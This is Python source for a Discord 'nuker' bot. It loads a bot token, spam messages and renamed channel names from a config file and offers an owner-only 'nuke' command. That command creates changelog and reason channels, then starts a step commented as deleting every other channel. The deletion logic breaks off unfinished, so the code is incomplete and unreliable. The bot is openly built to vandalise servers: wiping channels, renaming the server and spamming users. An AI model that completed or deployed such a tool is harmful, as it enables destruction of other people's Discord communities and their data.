import discord, json
from discord import Permissions
from discord.ext import commands


# Reads config.json file
with open('config.json', 'r') as config:
    config = json.load(config)
    token = config['bot_token']
    prefix = config['bot_prefix']
    server_nuked_name = config['server_nuked_name']
    nuked_channels = config['nuked_channel_names']
    messages = config['spam_messages']


# Init bot, changes default config, etc.
bot = commands.Bot(command_prefix = prefix, case_insensitive = True, description = 'Joee\'s discord nuker bot.', intents = discord.Intents.all())


# Tells user when bot is ready.
@bot.event
async def on_ready():
    print('''
       __                     _   __      __            
      / /___  ___  ___  _____/ | / /_  __/ /_____  _____
 __  / / __ \/ _ \/ _ \/ ___/  |/ / / / / //_/ _ \/ ___/
/ /_/ / /_/ /  __/  __(__  ) /|  / /_/ / ,< /  __/ /    
\____/\____/\___/\___/____/_/ |_/\__,_/_/|_|\___/_/     
    ''')
    print(f'{bot.user.name}#{bot.user.discriminator}, is logged in, and ready to cause chaos. (UID: {bot.user.id}, Prefix: {bot.command_prefix})')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="over some servers."))


# Nuke Command
@bot.command()
@commands.is_owner()
async def nuke(ctx):
    # Change discord bot presence.
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="a server get nuked."))

    # Create nuking changelog channel, and reasoning channel. Then gets the id's of said channels.
    await ctx.message.guild.create_text_channel('nuking-changelog')
    await ctx.message.guild.create_text_channel('nuking-reason')
    channels_to_ignore = {"reason":discord.utils.get(ctx.guild.channels, name='nuking-reason').id, "changelog":discord.utils.get(ctx.guild.channels, name = 'nuking-changelog').id}
    

    #Deletes all other channels
    all_channels = bot.get_all_channels()

# Stop Command
@bot.command()
@commands.is_owner()
async def stop(ctx):
    embed = discord.Embed(title = ':stop_sign: Nuking stopped. :stop_sign:', colour = discord.Color.from_rgb(157, 51, 255))
    embed.add_field(name = 'Joee\'s nuker has been stopped.', value = 'The connection to discord has been forcibly closed by a JoeeNuker staff.')
    await ctx.reply(embed = embed)
    await ctx.bot.close()
    print(f'{bot.user.name}#{bot.user.discriminator}, has been stopped in it\'s path of destruction. (Logged out.)')


# Init the bot, when the script is run.
bot.run(token)
